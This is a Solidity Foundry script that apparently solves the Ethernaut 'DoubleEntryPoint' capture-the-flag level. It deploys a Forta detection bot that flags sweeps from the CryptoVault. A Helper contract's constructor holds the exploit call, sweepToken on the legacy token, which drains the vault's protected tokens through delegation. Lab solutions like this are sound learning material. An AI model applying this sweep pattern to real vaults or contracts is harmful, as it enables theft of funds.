// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console} from "forge-std/Script.sol";
import { DoubleEntryPoint, Forta, LegacyToken, DelegateERC20, CryptoVault } from "../src/DoubleEntryPoint.sol";


contract Helper {

constructor (address creator) {

	
	DoubleEntryPoint	instance = DoubleEntryPoint(0xe0E978e08b228279184167C55a416B6cAee2d138);

	Forta forta = Forta(instance.forta());
	LegacyToken legacyToken = LegacyToken(instance.delegatedFrom());
	CryptoVault cryptoVault = CryptoVault(instance.cryptoVault());


	//console.logBytes32(bytes32(legacyToken.balanceOf(address(cryptoVault))));
        //console.logBytes32(bytes32(legacyToken.balanceOf(me)));
        cryptoVault.sweepToken((legacyToken));
        //console.logBytes32(bytes32(legacyToken.balanceOf(me)));


}
    
}


contract Bot {


	address public cryptoVaultAddress;
	Forta public forta;
	
	constructor (address fortaAddress, address cryptoVault) {
		cryptoVaultAddress = cryptoVault;
		forta = Forta(fortaAddress);
	}

	function handleTransaction(address user, bytes calldata msgData) external
	{



		bytes memory data = msgData;

		bytes32 arg1;
		bytes32 arg2;
		bytes32 arg3;


		assembly {
			arg1 := mload(add(data, 36))
			arg2 := mload(add(data, 68))
			arg3 := mload(add(data, 100))
		}

		address to = address(uint160(uint256(arg1)));
		uint256 value = uint256(arg2);
		address origSender = address(uint160(uint256(arg3)));


		if (origSender == cryptoVaultAddress)
		{
			forta.raiseAlert(user);
		}


		// selfdestruct(payable(address(0)));
		// bytes4 funcSelector = bytes4(msgData);
		// if (msgData.origSender == cryptoVaultAddress)
		// {
		//	forta.raiseAlert(user);
		// }
	}

	function test(address to, uint256 value, address origSender) external returns (bytes memory) {
		bytes memory data = msg.data;
		return data;
	}

}


contract DoubleEntryPointSolver is Script {

    DoubleEntryPoint public instance = DoubleEntryPoint(0xe0E978e08b228279184167C55a416B6cAee2d138);

	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

    function run() external {
        
        vm.startBroadcast(prv);
        

        console.log("||||||||||| Public Stuff |||||||||||");
        console.log(instance.owner());
        console.log(instance.cryptoVault());
        console.log(instance.player());
        console.log(instance.delegatedFrom());
        console.log(address(instance.forta()));


        console.log("||||||||||| known slot Stuff |||||||||||");
        for (uint256 s = 0; s < 10; s++) {
            console.logBytes32(vm.load(address(instance), bytes32(s)));
        }

        console.log("||||||||||| LegacyToken |||||||||||");


        Forta forta = Forta(instance.forta());
        LegacyToken legacyToken = LegacyToken(instance.delegatedFrom());
        CryptoVault cryptoVault = CryptoVault(instance.cryptoVault());

        
        console.log("am the receivpient of the cryptoVault ? ", cryptoVault.sweptTokensRecipient() == me);
        console.log("am i forbidden from transfering this ? ", address(cryptoVault.underlying()) == address(legacyToken));

        // new Helper(me);


	Bot bot = new Bot(address(forta), address(cryptoVault));

        forta.setDetectionBot(address(bot));


	// bytes memory dataAddress = bot.test(address(16151615), 65535, me);

        console.logBytes32(bytes32(instance.balanceOf(address(cryptoVault))));
        console.logBytes32(bytes32(instance.balanceOf(me)));
        // cryptoVault.sweepToken((legacyToken));
        console.logBytes32(bytes32(instance.balanceOf(me)));
        
        // legacyToken.transfer(me, 1);
        // console.logBytes32(bytes32(legacyToken.balanceOf(me)));


	// Bot bot = new Bot(address(forta), address(cryptoVault));

	// forta.setDetectionBot(address(bot));
        
        // console.log("||||||||||| DelegateERC20 |||||||||||");
        // DelegateERC20 dlgt = DelegateERC20(LGT.delegate());

        // dlgt.delegateTransfer(me, 0, me);
        // create bot and set it in forta 

        vm.stopBroadcast();

    }

}

